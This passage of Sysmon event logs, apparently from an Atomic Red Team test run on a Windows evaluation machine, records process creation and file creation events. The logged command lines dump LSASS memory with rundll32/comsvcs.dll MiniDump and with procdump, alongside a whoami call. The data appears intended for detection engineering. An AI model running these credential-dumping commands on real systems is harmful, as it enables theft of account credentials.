      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:12.2245870Z""/>
      
            
      <EventRecordID>19545</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:12.223</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4688-658c-a101-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">8248</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows host process (Rundll32)</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\System32\rundll32.exe"" C:\windows\System32\comsvcs.dll MiniDump 804 C:\Users\User\AppData\Local\Temp\lsass-comsvcs.dmp full</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=57A6B4BDF247C1A6CA08AC09A8F9B742,SHA256=98D37EFF504A7ADB864131EA4A042AAF4D79C4356960A8AB2FA656CC59AEC014,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C</Data>
      
            
      <Data Name=""ParentProcessGuid"">{f57bd86a-4686-658c-9f01-000000000f00}</Data>
      
            
      <Data Name=""ParentProcessId"">10608</Data>
      
            
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full}</Data>
      
            
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 15:45:10.781,,,,,,,,11,19544,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,4,,,0,,,,,,,{f57bd86a-4686-658c-9f01-000000000f00},3588,10608,,,,,,-,,,,,,2023-12-27T15:45:10.7833807Z,C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wowkwmgf.op3.ps1,11,,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:10.781,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>11</EventID>
      
            
      <Version>2</Version>
      
            
      <Level>4</Level>
      
            
      <Task>11</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:10.7833807Z""/>
      
            
      <EventRecordID>19544</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:10.781</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4686-658c-9f01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10608</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\__PSScriptPolicyTest_wowkwmgf.op3.ps1</Data>
      
            
      <Data Name=""CreationUtcTime"">2023-12-27 15:45:10.781</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""powershell.exe"" & {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full}",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows PowerShell,,,,,,1,19543,10.0.22621.2506 (WinBuild.160101.0800),"MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,PowerShell.EXE,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4686-658c-9f01-000000000f00},3588,10608,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:10.6522669Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:10.651,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:10.6522669Z""/>
      
            
      <EventRecordID>19543</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:10.651</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4686-658c-9f01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10608</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows PowerShell</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">PowerShell.EXE</Data>
      
            
      <Data Name=""CommandLine"">""powershell.exe"" &amp; {C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full}</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=2D1D70C92A419D9079B047954C611886,SHA256=C50057756CDB25D481CF2502ABCEF124F864C27618C5057468BFC6B82B2C4EDD,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe"" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Command Processor,,,,,,1,19542,10.0.22621.2506 (WinBuild.160101.0800),"MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964",C:\Windows\System32\cmd.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,Cmd.Exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4685-658c-9d01-000000000f00},3588,10912,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:09.5981072Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:09.597,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:09.5981072Z""/>
      
            
      <EventRecordID>19542</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:09.597</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4685-658c-9d01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">10912</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\cmd.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">Windows Command Processor</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">Cmd.Exe</Data>
      
            
      <Data Name=""CommandLine"">""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe"" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=133D568ECCB557E37BEA1459521CBAC2,SHA256=05A30592D2C3421C41121145C6EEFA7C81FEA6B42D6233A522240A8468326B9C,IMPHASH=D73E39DAB3C8B57AA408073D01254964</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\whoami.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\,whoami - displays logged on user information,,,,,,1,19541,10.0.22621.1 (WinBuild.160101.0800),"MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292",C:\Windows\System32\whoami.exe,,Medium,0x8000000000000000,4,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,0,whoami.exe,-,-,{00000000-0000-0000-0000-000000000000},1688,-,{f57bd86a-4684-658c-9c01-000000000f00},3588,2020,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-27T15:45:08.1776497Z,,1,1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 15:45:08.175,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    
        
    <System>
      
            
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      
            
      <EventID>1</EventID>
      
            
      <Version>5</Version>
      
            
      <Level>4</Level>
      
            
      <Task>1</Task>
      
            
      <Opcode>0</Opcode>
      
            
      <Keywords>0x8000000000000000</Keywords>
      
            
      <TimeCreated SystemTime=""2023-12-27T15:45:08.1776497Z""/>
      
            
      <EventRecordID>19541</EventRecordID>
      
            
      <Correlation/>
      
            
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      
            
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      
            
      <Computer>WinDev2309Eval</Computer>
      
            
      <Security UserID=""S-1-5-18""/>
      
        
    </System>
    
        
    <EventData>
      
            
      <Data Name=""RuleName"">-</Data>
      
            
      <Data Name=""UtcTime"">2023-12-27 15:45:08.175</Data>
      
            
      <Data Name=""ProcessGuid"">{f57bd86a-4684-658c-9c01-000000000f00}</Data>
      
            
      <Data Name=""ProcessId"">2020</Data>
      
            
      <Data Name=""Image"">C:\Windows\System32\whoami.exe</Data>
      
            
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      
            
      <Data Name=""Description"">whoami - displays logged on user information</Data>
      
            
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      
            
      <Data Name=""Company"">Microsoft Corporation</Data>
      
            
      <Data Name=""OriginalFileName"">whoami.exe</Data>
      
            
      <Data Name=""CommandLine"">""C:\Windows\system32\whoami.exe""</Data>
      
            
      <Data Name=""CurrentDirectory"">C:\Users\User\</Data>
      
            
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      
            
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      
            
      <Data Name=""LogonId"">0x2f87b</Data>
      
            
      <Data Name=""TerminalSessionId"">1</Data>
      
            
      <Data Name=""IntegrityLevel"">Medium</Data>
      
            
      <Data Name=""Hashes"">MD5=E0F37DB23E4F3163159A815610DF8CF2,SHA256=574BC2A2995FE2B1F732CCD39F2D99460ACE980AF29EFDF1EB0D3E888BE7D6F0,IMPHASH=62935820E434AF643547B7F5F5BD0292</Data>
      
            
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      
            
      <Data Name=""ParentProcessId"">1688</Data>
      
            
      <Data Name=""ParentImage"">-</Data>
      
            
      <Data Name=""ParentCommandLine"">-</Data>
      
            
      <Data Name=""ParentUser"">-</Data>
      
        
    </EventData>
    
    
  </Event>
  
    
  
"
